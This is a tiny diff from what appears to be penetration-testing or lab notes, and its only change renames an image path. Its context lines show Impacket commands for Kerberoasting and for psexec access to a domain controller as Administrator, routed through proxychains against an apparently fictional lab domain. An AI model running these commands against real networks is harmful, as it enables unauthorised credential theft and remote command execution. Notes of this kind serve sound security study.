@@ -57,4 +57,4 @@ proxychains python3 GetUserSPNs.py -k -no-pass -dc-ip 10.110.0.222 CROOK.BADCORP
 proxychains python3 psexec.py -dc-ip 10.110.0.222 Administrator@dc02.CROOK.BADCORP.LOCAL -k -no-pass
 ```
 
-![](<../../../../../.gitbook/assets/image (27).png>)
+![](<../../../../../.gitbook/assets/image (27) (1).png>)
